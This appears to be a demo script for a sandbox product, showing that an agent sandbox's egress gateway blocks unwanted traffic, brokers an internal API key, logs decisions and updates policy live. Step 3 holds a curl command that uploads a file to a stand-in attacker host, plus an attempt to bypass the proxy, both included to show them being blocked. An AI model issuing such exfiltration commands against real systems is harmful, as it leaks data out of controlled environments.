#!/usr/bin/env python3
"""A five-minute tour of Igloo sandboxes: what an agent can do, what it can't, and the record.

Needs a running Igloo with the egress gateway enabled, and (for the credential step) the
stand-in internal service from e2e/testdata/upstream.yaml:

    export IGLOO_URL=http://localhost:8080 IGLOO_TOKEN=<an API token or session token>
    python3 examples/agent_demo.py
"""
import os
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "clients", "python"))
from igloo_sandbox import IglooError, Sandbox  # noqa: E402

INTERNAL = os.environ.get("DEMO_INTERNAL_HOST", "internal-api.default.svc.cluster.local")


def step(n, title):
    print(f"\n\033[1m{n}. {title}\033[0m")


def show(label, value):
    print(f"   {label:<26}{value}")


def main():
    step(1, "Create a sandbox that may reach one internal service, and nothing else")
    policy = dict(
        allow=[INTERNAL],
        allow_private=True,  # the stand-in service lives inside the cluster
        routes=[{"name": "internal", "upstream": f"http://{INTERNAL}:8080", "header": "X-Api-Key", "secret": "UPSTREAM_KEY"}],
    )
    with Sandbox.create(name="agent-demo", ttl_seconds=600, **policy) as sb:
        show("sandbox", sb.id)
        show("deleted automatically", sb.expires_at + "  (or when this program ends)")

        step(2, "The agent does ordinary work: write code, run it")
        # Igloo's workspace image is minimal (sh, awk, curl); use `image=` for one with your runtimes.
        sb.write_file("analyse.sh", "#!/bin/sh\nawk '{ for (i = 1; i <= NF; i++) s += $i } END { print s }'\n", mode=0o755)
        r = sb.exec(["sh", "analyse.sh"], stdin="40 2", check=True)
        show("analyse.sh says", r.stdout.strip())

        step(3, "The agent tries to send data somewhere it was never allowed to")
        # For HTTPS the proxy's answer to the CONNECT request is what matters (curl itself reports 000).
        r = sb.exec("curl -s -m 8 -o /dev/null -w '%{http_connect}' https://attacker.example/upload -d @analyse.sh")
        show("through the proxy", f"refused with {r.stdout.strip()}   <- the gateway said no")
        r = sb.exec("curl -s -m 5 --noproxy '*' -o /dev/null -w '%{http_code}' http://1.1.1.1/", timeout=15)
        show("around the proxy", f"{'dropped' if r.stdout.strip() == '000' else 'REACHED, HTTP ' + r.stdout}   <- the network gave it nowhere to go")

        step(4, "The agent uses an internal API without ever holding its key")
        r = sb.exec('curl -s -m 8 -w " (HTTP %{http_code})" -H "Authorization: Bearer $IGLOO_ROUTE_TOKEN" "$IGLOO_ROUTE_BASE/internal/data"')
        show("internal API says", " ".join(r.stdout.split()))
        leaked = sb.exec("env | grep -c real-upstream-secret || true").stdout.strip()
        show("copies of the key here", f"{leaked}   <- the sandbox never sees it")

        step(5, "Everything the gateway decided is on the record")
        events = []
        for _ in range(15):  # the gateway reports in batches about once a second
            events = sb.activity(limit=10)
            if any(e["decision"] == "deny" for e in events) and any(e["kind"] == "route" for e in events):
                break
            time.sleep(1)
        for e in reversed(events):
            show(f"{'blocked' if e['decision'] == 'deny' else 'allowed':<8}{e['kind']:<8}", f"{e['host']}  [{e.get('rule', '')}]")

        step(6, "Tighten the policy while it runs; no restart")
        sb.set_policy(allow=[], allow_private=True, routes=[])
        print("   (takes effect within ~15 seconds)")
    print("\nSandbox deleted.")


if __name__ == "__main__":
    try:
        main()
    except IglooError as e:
        sys.exit(f"error: {e}")
